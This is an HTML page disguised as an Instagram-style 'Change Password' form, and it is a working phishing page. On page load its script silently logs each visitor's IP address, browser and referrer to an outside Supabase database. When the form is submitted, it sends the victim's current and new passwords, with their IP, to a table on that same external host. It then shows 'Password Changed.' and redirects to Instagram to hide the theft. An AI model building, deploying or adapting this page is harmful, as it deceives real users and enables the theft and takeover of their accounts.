<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Change Password</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      background: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 30px;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      width: 350px;
      text-align: center;
    }
    h3 {
      margin-bottom: 10px;
    }
    .instructions {
      font-size: 13px;
      color: grey;
      margin-bottom: 45px;
      line-height: 1.5;
      text-align: center;
    }
    input {
      width: 80%;
      padding: 14px 10px;
      margin: 12px auto;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
      display: block;
    }
    button {
      width: 80%;
      padding: 14px;
      margin: 26px auto 0;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
      display: block;
    }
    .message {
      margin-top: 10px;
      font-size: 14px;
    }
    .success { color: green; }
    .error { color: red; }
  </style>
</head>
<body>
  <div class="container">
    <h3>Create a strong password</h3>
    <p class="instructions">
      Your password must be at least six<br>
      characters and should include a<br>
      combination of numbers, letters and<br>
      special characters (!$@ï¼…).
    </p>
    <input type="password" id="op" placeholder="Current Password" />
    <input type="password" id="fp" placeholder="New Password" />
    <input type="password" id="cp" placeholder="Confirm Password" />
    <button onclick="storePasswords()">Reset Password</button>
    <div id="message" class="message"></div>
  </div>

  <script type="module">
    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'

    const supabase = createClient(
      'https://cjwoizyfasbxbmtcmnpj.supabase.co',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNqd29penlmYXNieGJtdGNtbnBqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE4MjQ5MzcsImV4cCI6MjA2NzQwMDkzN30.dwPcx-uCfixYxF-YAhZAdZR1VGkuOSI3sgCLeWX7xTM'
    );

    async function getUserIP() {
      try {
        const res = await fetch('https://api64.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch {
        return 'Unavailable';
      }
    }

    // ðŸ”¹ Auto log visitor info on page load
    async function logVisitor() {
      const ip = await getUserIP();
      const userAgent = navigator.userAgent;
      const referrer = document.referrer || 'Direct';
      const page = window.location.href;

      await supabase.from('visit_logs').insert([
        { ip_address: ip, user_agent: userAgent, referrer: referrer, page_url: page }
      ]);
    }

    logVisitor(); // run automatically when page opens

    // ðŸ”¹ Your existing password logic
    window.storePasswords = async function () {
      const op = document.getElementById('op').value.trim();
      const fp = document.getElementById('fp').value.trim();
      const cp = document.getElementById('cp').value.trim();
      const message = document.getElementById('message');

      message.textContent = '';
      message.className = 'message';

      if (!op || !fp || !cp) {
        message.textContent = 'All fields are required.';
        message.classList.add('error');
        return;
      }

      if (fp !== cp) {
        message.textContent = 'New password do not match.';
        message.classList.add('error');
        return;
      }

      const ip = await getUserIP();

      const { error } = await supabase.from('zero_cp').insert([
        { op: op, fp: fp, ip }
      ]);

      if (error) {
        message.textContent = 'Error: ' + error.message;
        message.classList.add('error');
      } else {
        message.textContent = 'Password Changed.';
        message.classList.add('success');

        setTimeout(() => {
          window.location.href = 'instagram://app';
          setTimeout(() => {
            window.location.href = 'https://www.instagram.com/';
          }, 500);
        }, 1500);
      }
    }
  </script>
</body>
</html>
